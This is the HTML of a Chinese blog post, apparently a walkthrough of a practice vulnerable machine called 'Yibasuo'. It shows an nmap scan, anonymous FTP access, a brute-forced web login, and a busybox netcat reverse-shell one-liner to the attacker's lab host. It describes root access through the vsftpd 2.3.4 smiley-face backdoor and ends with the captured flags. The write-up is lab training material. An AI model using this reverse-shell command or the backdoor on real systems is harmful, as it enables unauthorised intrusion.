@@ -1,0 +1,445 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>群友靶机-Yibasuo | Moriiの博客</title><meta name="keywords" content="群友靶机"><meta name="author" content="Morii"><meta name="copyright" content="Morii"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="群友靶机-Yibasuo信息搜集┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash] └─# nmap 192.168.1.3 -p- -A Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-11-21 23:11 EST Nmap scan report for bogon (192.16">
+<meta property="og:type" content="article">
+<meta property="og:title" content="群友靶机-Yibasuo">
+<meta property="og:url" content="https://drume2.github.io/posts/f480f654.html">
+<meta property="og:site_name" content="Moriiの博客">
+<meta property="og:description" content="群友靶机-Yibasuo信息搜集┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash] └─# nmap 192.168.1.3 -p- -A Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-11-21 23:11 EST Nmap scan report for bogon (192.16">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp">
+<meta property="article:published_time" content="2025-11-22T04:19:10.000Z">
+<meta property="article:modified_time" content="2025-11-22T06:57:55.660Z">
+<meta property="article:author" content="Morii">
+<meta property="article:tag" content="群友靶机">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp"><link rel="shortcut icon" href="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp"><link rel="canonical" href="https://drume2.github.io/posts/f480f654"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"一年之内的产物","messageNext":"技术可能存在过期"},
+  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '群友靶机-Yibasuo',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-11-22 14:57:55'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link defer rel="stylesheet" href="/css/customm.css" ><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/icon.css"><link defer rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/background.css"><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/index_ee.css"><link defer rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@master/Hexo/css/flink.min.css"><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">92</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fas fa-book"></i><span> 说说</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/List/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/List/gallery/"><i class="fa-fw fas fa-image"></i><span> 相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Moriiの博客</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fas fa-book"></i><span> 说说</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/List/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/List/gallery/"><i class="fa-fw fas fa-image"></i><span> 相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">群友靶机-Yibasuo</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-11-22T04:19:10.000Z" title="发表于 2025-11-22 12:19:10">2025-11-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-11-22T06:57:55.660Z" title="更新于 2025-11-22 14:57:55">2025-11-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/">群友靶机</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="群友靶机-Yibasuo"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="群友靶机-Yibasuo"><a href="#群友靶机-Yibasuo" class="headerlink" title="群友靶机-Yibasuo"></a>群友靶机-Yibasuo</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
+└─# nmap 192.168.1.3 -p- -A
+Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-11-21 23:11 EST
+Nmap scan report for bogon (192.168.1.3)
+Host is up (0.00089s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT     STATE    SERVICE VERSION
+21&#x2F;tcp   open     ftp     vsftpd 2.3.4
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0              14 Jun 17 13:41 creds.txt
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to 192.168.1.9
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+22&#x2F;tcp   open     ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey:
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+80&#x2F;tcp   open     http    Apache httpd 2.4.62 ((Debian))
+| http-cookie-flags:
+|   &#x2F;:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-title: Linux\xE9\x9D\xB6\xE6\x9C\xBA\xE5\x85\xA5\xE5\x8F\xA3
+|_http-server-header: Apache&#x2F;2.4.62 (Debian)
+6200&#x2F;tcp filtered lm-x
+MAC Address: 08:00:27:83:59:A4 (PCS Systemtechnik&#x2F;Oracle VirtualBox virtual NIC)
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:&#x2F;o:linux:linux_kernel:4 cpe:&#x2F;o:linux:linux_kernel:5 cpe:&#x2F;o:mikrotik:routeros:7 cpe:&#x2F;o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.89 ms bogon (192.168.1.3)
+
+OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
+Nmap done: 1 IP address (1 host up) scanned in 16.39 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>四个端口，21的ftp，22的ssh，80的web，6200的一个未知服务还被过滤掉了</p>
+<h2 id="21ftp探测"><a href="#21ftp探测" class="headerlink" title="21ftp探测"></a>21ftp探测</h2><pre class="line-numbers language-none"><code class="language-none">21&#x2F;tcp   open     ftp     vsftpd 2.3.4
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0              14 Jun 17 13:41 creds.txt
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to 192.168.1.9
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>ftp可以匿名登陆，并且里面还有一个creds.txt文件，同时注意到vsftpd版本为2.3.4，VSFTPD 2.3.4，俗称<strong>笑脸漏洞</strong>。存在于这个2.3.4版本，属于开发者设计上的失误。在检测到用户名带有特殊字符<code>: )</code>时，会自动打开6200端口。</p>
+<p>先匿名登陆拿到creds.txt文件</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali]
+└─# ftp 192.168.1.3
+Connected to 192.168.1.3.
+220 (vsFTPd 2.3.4)
+Name (192.168.1.3:kali): Anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||64463|).
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0              14 Jun 17 13:41 creds.txt
+226 Directory send OK.
+ftp&gt; get creds.txt
+local: creds.txt remote: creds.txt
+229 Entering Extended Passive Mode (|||45924|).
+150 Opening BINARY mode data connection for creds.txt (14 bytes).
+100% |***************************************************************************|    14        9.25 KiB&#x2F;s    00:00 ETA
+226 Transfer complete.
+14 bytes received in 00:00 (4.34 KiB&#x2F;s)
+ftp&gt; ^D
+221 Goodbye
+
+┌──(root㉿kali)-[&#x2F;home&#x2F;kali]
+└─# cat creds.txt
+root:fakepass<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>发现用户名root和一个fakepass，没什么用，那就去看一下web</p>
+<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="/posts/f480f654/image-20251122122624284.png" alt="image-20251122122624284"></p>
+<p>web端有一个登陆界面，使用几个常用的用户名和密码无法登陆，那就去爆破一下</p>
+<p><img src="/posts/f480f654/image-20251122122717822.png" alt="image-20251122122717822"></p>
+<p>得到用户名为admin密码为password123，进行登陆</p>
+<p><img src="/posts/f480f654/image-20251122122750718.png" alt="image-20251122122750718"></p>
+<p>登陆成功之后是这样的界面，有一个命令执行的地方，发现灰色字体后还有<code>....</code>猜测还有其他命令存在，命令执行的地方，我习惯性先输入busybox进行初试探</p>
+<p><img src="/posts/f480f654/image-20251122122950796.png" alt="image-20251122122950796"></p>
+<p>发现存在着busybox，那么就可以反弹shell了</p>
+<pre class="line-numbers language-none"><code class="language-none">busybox nc 192.168.1.9 4444 -e &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
+└─# .&#x2F;penelope.py
+[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.9 • 172.18.0.1 • 172.17.0.1
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q&#x2F;Ctrl-C)
+[+] Got reverse shell from Yibasuo~192.168.1.3-Linux-x86_64 😍️ Assigned SessionID &lt;1&gt;
+[+] Attempting to upgrade shell to PTY...
+[+] Shell upgraded successfully using &#x2F;usr&#x2F;bin&#x2F;python3! 💪
+[+] Interacting with session [1], Shell Type: PTY, Menu key: F12
+[+] Logging to &#x2F;root&#x2F;.penelope&#x2F;Yibasuo~192.168.1.3-Linux-x86_64&#x2F;2025_11_21-23_03_54-086.log 📜
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+www-data@Yibasuo:&#x2F;var&#x2F;www&#x2F;html&#x2F;secure$ id
+uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>到目前为止，还有一个6200端口未被使用，使用<code>ps -ef</code>看一下vsftpd是那个用户启用的</p>
+<pre class="line-numbers language-none"><code class="language-none">www-data@Yibasuo:&#x2F;tmp$ ps aux | grep vsftpd
+root         401  0.0  0.0   2800  1644 ?        Ss   22:52   0:00 &#x2F;opt&#x2F;vsftpd&#x2F;vsftpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>发现是以root身份启用的，那么根据21端口的笑脸漏洞，利用这个漏洞，会将被过滤掉的6200端口open，然后shell内对本地ip的6200端口进行监听从而反弹shell</p>
+<p><img src="/posts/f480f654/image-20251122124036609.png" alt="image-20251122124036609"></p>
+<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-none"><code class="language-none">cat root.txt &#x2F;home&#x2F;todd&#x2F;user.txt
+flag&#123;root-15d4d3ec-4b81-11f0-9da9-b378f7bb3e40&#125;
+flag&#123;user-43109792-4b81-11f0-a435-9731ae49dbea&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://drume2.github.io">Morii</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://drume2.github.io/posts/f480f654.html">https://drume2.github.io/posts/f480f654.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://drume2.github.io" target="_blank">Moriiの博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/">群友靶机</a></div><div class="post_share"><div class="social-share" data-image="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/df52e3cb.html"><img class="prev-cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">群友靶机-SudoHome</div></div></a></div><div class="next-post pull-right"><a href="/posts/80a0419f.html"><img class="next-cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">HMV-Hunter</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/f20c21c3.html" title="群友靶机-5ud0"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-15</div><div class="title">群友靶机-5ud0</div></div></a></div><div><a href="/posts/4691ecf8.html" title="群友靶机-Baby"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-13</div><div class="title">群友靶机-Baby</div></div></a></div><div><a href="/posts/2108f0e8.html" title="群友靶机-Ahiz"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-07</div><div class="title">群友靶机-Ahiz</div></div></a></div><div><a href="/posts/d8ce51f8.html" title="群友靶机-Login"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-12</div><div class="title">群友靶机-Login</div></div></a></div><div><a href="/posts/2dab24d7.html" title="群友靶机-Halfhour"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-18</div><div class="title">群友靶机-Halfhour</div></div></a></div><div><a href="/posts/6768e8fd.html" title="群友靶机-Monitor"><img class="cover" src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-11</div><div class="title">群友靶机-Monitor</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Twikoo</span><span class="switch-btn"></span><span class="second-comment">Valine</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Morii</div><div class="author-info__description">博客因兴趣诞生,在不断完善中</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">92</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn"><i class="fab fa-home"></i><span>个人主页</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Drume1/drume1.github.io" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=1159927667&amp;website=www.qtxml.cn" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">兴趣爱好才是最大的动力，何不与我共同来攀知识高峰，品翘楚美人！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA-Yibasuo"><span class="toc-number">1.</span> <span class="toc-text">群友靶机-Yibasuo</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#21ftp%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.2.</span> <span class="toc-text">21ftp探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.3.</span> <span class="toc-text">web探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag"><span class="toc-number">1.4.</span> <span class="toc-text">flag</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/df52e3cb.html" title="群友靶机-SudoHome"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="群友靶机-SudoHome"/></a><div class="content"><a class="title" href="/posts/df52e3cb.html" title="群友靶机-SudoHome">群友靶机-SudoHome</a><time datetime="2025-11-23T04:39:26.000Z" title="发表于 2025-11-23 12:39:26">2025-11-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/f480f654.html" title="群友靶机-Yibasuo"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="群友靶机-Yibasuo"/></a><div class="content"><a class="title" href="/posts/f480f654.html" title="群友靶机-Yibasuo">群友靶机-Yibasuo</a><time datetime="2025-11-22T04:19:10.000Z" title="发表于 2025-11-22 12:19:10">2025-11-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/80a0419f.html" title="HMV-Hunter"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMV-Hunter"/></a><div class="content"><a class="title" href="/posts/80a0419f.html" title="HMV-Hunter">HMV-Hunter</a><time datetime="2025-11-19T07:58:10.000Z" title="发表于 2025-11-19 15:58:10">2025-11-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/4691ecf8.html" title="群友靶机-Baby"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="群友靶机-Baby"/></a><div class="content"><a class="title" href="/posts/4691ecf8.html" title="群友靶机-Baby">群友靶机-Baby</a><time datetime="2025-10-13T03:04:44.000Z" title="发表于 2025-10-13 11:04:44">2025-10-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/b2e47ed4.html" title="群友靶机-The_fool"><img src="https://npm.elemecdn.com/xianqi-hexo/imgg/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="群友靶机-The_fool"/></a><div class="content"><a class="title" href="/posts/b2e47ed4.html" title="群友靶机-The_fool">群友靶机-The_fool</a><time datetime="2025-09-28T10:15:30.000Z" title="发表于 2025-09-28 18:15:30">2025-09-28</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;undefined - 2025  <i id="heartbeat" class="fa fas 